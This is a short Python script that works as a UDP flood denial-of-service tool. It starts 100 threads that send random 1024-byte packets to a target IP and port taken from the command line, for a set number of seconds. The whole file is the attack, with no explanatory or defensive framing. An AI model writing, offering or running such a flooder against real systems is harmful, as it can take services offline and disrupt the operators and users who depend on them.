import socket
import random
import threading
import sys
import time

def attack(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(1024)
            s.sendto(bytes_data, (ip, int(port)))
        except:
            pass

if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = []

    for _ in range(100):
        thread = threading.Thread(target=attack, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    for t in threads:
        t.join()